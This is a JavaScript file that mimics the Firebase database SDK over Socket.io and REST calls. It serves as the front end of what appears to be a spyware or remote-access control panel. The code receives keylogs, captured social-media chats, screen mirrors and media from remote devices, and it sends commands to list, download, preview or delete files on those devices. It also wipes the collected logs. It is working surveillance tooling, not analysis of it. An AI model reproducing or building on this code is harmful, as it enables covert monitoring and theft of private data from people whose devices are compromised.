// Mock Firebase Realtime Database SDK mapping to Socket.io and REST API
(function() {
  // Connect to the Flask Socket.io server
  const socket = io();
  
  const listeners = {};
  
  socket.on('connect', () => {
    console.log("Mock Firebase: Socket connected successfully");
  });
  
  socket.on('device_status_change', (data) => {
    triggerListeners(`devices/${data.device_id}`);
    triggerListeners(`devices/${data.device_id}/info`);
    triggerListeners(`devices/${data.device_id}/media`);
  });
  
  socket.on('media_updated', (data) => {
    triggerListeners(`devices/${data.device_id}/media`);
    triggerListeners(`devices/${data.device_id}`);
  });
  
  socket.on('keylog_received', (data) => {
    triggerListeners(`devices/${data.device_id}/keylogs`, 'child_added', data);
  });
  
  socket.on('files_updated', (data) => {
    triggerListeners(`devices/${data.device_id}/files`);
  });
  
  socket.on('mirror_update', (data) => {
    triggerListeners(`devices/${data.device_id}/mirror`);
  });

  socket.on('social_message_received', (data) => {
    triggerListeners(`devices/${data.device_id}/chats/${data.platform}`);
    triggerListeners(`devices/${data.device_id}/chats/${data.platform}/${data.contact}/messages`);
  });

  function triggerListeners(path, eventType = 'value', extraData = null) {
    if (listeners[path]) {
      listeners[path].forEach(item => {
        if (item.eventType === eventType) {
          if (eventType === 'value') {
            const parts = path.split('/');
            const deviceId = parts[1];
            if (!deviceId || deviceId === 'undefined') {
              fetch('/api/devices')
                .then(r => r.json())
                .then(devicesList => {
                  const devicesMap = {};
                  devicesList.forEach(d => {
                    devicesMap[d._id] = d;
                  });
                  const snapshot = {
                    val: () => devicesMap,
                    key: 'devices'
                  };
                  item.callback(snapshot);
                }).catch(e => console.error("Mock Firebase Devices Fetch Error:", e));
              return;
            }
            fetch(`/api/device/${deviceId}/data`)
              .then(r => r.json())
              .then(deviceData => {
                let val = deviceData;
                const pathParts = parts.slice(2);
                pathParts.forEach(p => {
                  if (val) val = val[p];
                });
                
                const snapshot = {
                  val: () => val,
                  key: pathParts[pathParts.length - 1] || deviceId
                };
                item.callback(snapshot);
              }).catch(e => console.error("Mock Firebase Fetch Error:", e));
          } else if (eventType === 'child_added' && extraData) {
            const snapshot = {
              val: () => extraData,
              key: extraData.time
            };
            item.callback(snapshot);
          }
        }
      });
    }
  }

  window.firebase = {
    initializeApp: function() { return this; },
    database: function() {
      return {
        ref: function(path) {
          return {
            on: function(eventType, callback) {
              if (!listeners[path]) listeners[path] = [];
              listeners[path].push({ eventType, callback });
              
              if (eventType === 'value') {
                triggerListeners(path, 'value');
              } else if (eventType === 'child_added') {
                const parts = path.split('/');
                const deviceId = parts[1];
                fetch(`/api/device/${deviceId}/data`)
                  .then(r => r.json())
                  .then(deviceData => {
                    const pathParts = parts.slice(2);
                    let val = deviceData;
                    pathParts.forEach(p => {
                      if (val) val = val[p];
                    });
                    if (val) {
                      Object.values(val).forEach(item => {
                        const snapshot = {
                          val: () => item,
                          key: item.time
                        };
                        callback(snapshot);
                      });
                    }
                  }).catch(e => console.error("Mock Firebase child_added Error:", e));
              }
            },
            once: function(eventType, callback) {
              const parts = path.split('/');
              const deviceId = parts[1];
              fetch(`/api/device/${deviceId}/data`)
                .then(r => r.json())
                .then(deviceData => {
                  const pathParts = parts.slice(2);
                  let val = deviceData;
                  pathParts.forEach(p => {
                    if (val) val = val[p];
                  });
                  const snapshot = {
                    val: () => val,
                    key: pathParts[pathParts.length - 1] || deviceId
                  };
                  callback(snapshot);
                }).catch(e => console.error("Mock Firebase once Error:", e));
            },
            off: function(eventType) {
              if (listeners[path]) {
                if (eventType) {
                  listeners[path] = listeners[path].filter(item => item.eventType !== eventType);
                } else {
                  delete listeners[path];
                }
              }
            },
            set: function(value, onComplete) {
              const parts = path.split('/');
              if (parts[0] === 'commands' && parts[2] === 'file_manager') {
                const deviceId = parts[1];
                const action = value.action;
                let payloadAction = action;
                
                if (action === 'LIST_FILES') {
                  payloadAction = 'LIST_FILES:' + (value.path || '');
                } else if (action === 'DELETE_FILE') {
                  payloadAction = 'DELETE_FILE:' + (value.path || '');
                } else if (action === 'DOWNLOAD_FILE') {
                  payloadAction = 'DOWNLOAD_FILE:' + (value.target || '');
                } else if (action === 'PREVIEW_FILE') {
                  payloadAction = 'PREVIEW_FILE:' + (value.target || '');
                }
                
                fetch(`/api/device/${deviceId}/action`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ action: payloadAction })
                }).then(r => r.json())
                  .then(res => {
                    if (onComplete) onComplete(null);
                  });
              } else {
                if (onComplete) onComplete(null);
              }
            },
            remove: function(onComplete) {
              const parts = path.split('/');
              const deviceId = parts[1];
              if (parts[2] === 'keylogs') {
                fetch(`/api/device/${deviceId}/clear_keylogs`, { method: 'POST' })
                  .then(() => { if (onComplete) onComplete(null); });
              } else if (parts[2] === 'media') {
                const mediaKey = parts[3];
                fetch(`/api/device/${deviceId}/delete_media/${mediaKey}`, { method: 'POST' })
                  .then(() => { if (onComplete) onComplete(null); });
              } else if (parts[2] === 'chats') {
                const platform = parts[3];
                const contact = parts[4];
                fetch(`/api/device/${deviceId}/clear_chats`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ platform: platform, contact: contact })
                }).then(() => { if (onComplete) onComplete(null); });
              } else {
                if (onComplete) onComplete(null);
              }
            },
            limitToLast: function() { return this; }
          };
        }
      };
    }
  };
})();
